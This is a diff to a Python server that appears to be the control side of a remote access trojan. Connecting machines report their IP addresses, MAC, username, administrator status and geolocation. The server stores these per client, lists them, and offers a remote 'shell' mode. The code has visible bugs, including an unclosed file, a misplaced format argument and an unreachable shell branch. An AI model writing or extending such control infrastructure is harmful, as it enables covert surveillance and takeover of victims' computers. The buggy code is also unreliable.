@@ -8,7 +8,7 @@ from _thread import *
 ServerSocket = socket.socket()
 host = '127.0.0.1'
 port = 1233
-ThreadCount = 0
+
 try:
     ServerSocket.bind((host, port))
 except socket.error as e:
@@ -82,7 +82,11 @@ def TrouverMac(nom_fichier):
     return data["mac_address"]
 
 def DefinirIdConn(macAdress):
-    test = ""
+    fichier = open(TestMacAddress(".", ".txt", macAdress)[1], "r")
+    data = json.load(fichier)
+    print(data["client_num"])
+    fichier.close
+    return data["client_num"]
         
 def TestMacAddress(path,extension,macAddress):
     list_dir = []
@@ -94,10 +98,19 @@ def TestMacAddress(path,extension,macAddress):
             fileName, fileExtension = os.path.splitext(file)
             if TrouverMac(fileName + fileExtension) == macAddress:
                 print("l'adresse mac corespond")
-                return True
+                return True, fileName + fileExtension
             else:
                 print("l'adresse mac ne corespond pas")
-    return False
+    return False, fileName + fileExtension
+
+def CountClients(path):
+    list_dir = []
+    list_dir = os.listdir(path)
+    count = 0
+    for file in list_dir:
+        if file.endswith(".txt"): # eg: '.txt'
+            count += 1
+    return count
 
 def threaded_client(connection, id_conn):
     global test
@@ -107,9 +120,15 @@ def threaded_client(connection, id_conn):
     platform, public_ip, local_ip, mac_address, architecture, device, username, administrator, geolocation, ipv4  = infos.split(SEPARATOR)
     #id_conn = selon macaddresse
     print("\t Platforme : " + platform + "\n\t Ip Public : " + public_ip + "\n\t Ip Local : " + local_ip + "\n\t Adresse Mac : " + mac_address + "\n\t Architecture : " + architecture + "\n\t Device : " + device + "\n\t Username : " + username + "\n\t Administrator : " + administrator+ "\n\t Geolocation : " + geolocation+ "\n\t Ipv4 : " + ipv4)
-    if TestMacAddress(".", ".txt", mac_address) == False:
+    if TestMacAddress(".", ".txt", mac_address)[0] == False:
         print("Nouveau Client !")
         InscrireClient(id_conn, platform, public_ip, local_ip, mac_address, architecture, device, username, administrator, geolocation)
+    else:
+        print("Client existe deja, num par defaut : " + str(id_conn))
+        id_conn = DefinirIdConn(mac_address)
+        print("Nouveau id : " + str(id_conn))
+
+
         
     while True:
         if "shell" in test:
@@ -150,6 +169,33 @@ def threaded_client(connection, id_conn):
         #print("fin de boucle")
     connection.close()
 
+def AfficherClients(path):
+    list_dir = []
+    list_dir = os.listdir(path)
+    for file in list_dir:
+        if file.endswith(".txt"): # eg: '.txt'
+            fileName, fileExtension = os.path.splitext(file)
+            with open(fileName + fileExtension, "r") as file:
+
+                data = json.load(file)
+                client_num = data["client_num"]
+                platform = data["platform"]
+                public_ip = data["public_ip"]
+                local_ip = data["local_ip"]
+                mac_address = data["mac_address"]
+                architecture = data["architecture"]
+                device = data["device"]
+                username = data["username"]
+                administrator = data["administrator"]
+                geolocation = data["geolocation"]
+                file.close()
+                print("\t\tListe clients :")
+                print("\nNumero Client : %s\n\tPlatform : %s\
+                \n\tPublic ip : %s\n\tLocal ip : %s\n\tMac address : %s\n\tArchitecture : %s\
+                \n\tDevice : %s\n\tUsername : %s\n\tAdministrator : %s\n\tGeolocation : %s" \
+                % (client_num, platform,public_ip, local_ip,mac_address, architecture,\
+                device, username,administrator, client_num,))
+
 def prompt():
     global local
     local = True
@@ -166,13 +212,16 @@ def prompt():
                     print(menu_help)
                 if "exit" in lcmd:
                     break
+                if "clients" in lcmd:
+                    AfficherClients(".")
                 lcmd = ""
                 if "shell" in lcmd:
                     test = ""
                     lcmd = ""
                     local = False
-                
-                    
+
+ThreadCount = CountClients(".")
+
 start_new_thread(prompt, ())
 while True:
     Client, address = ServerSocket.accept()
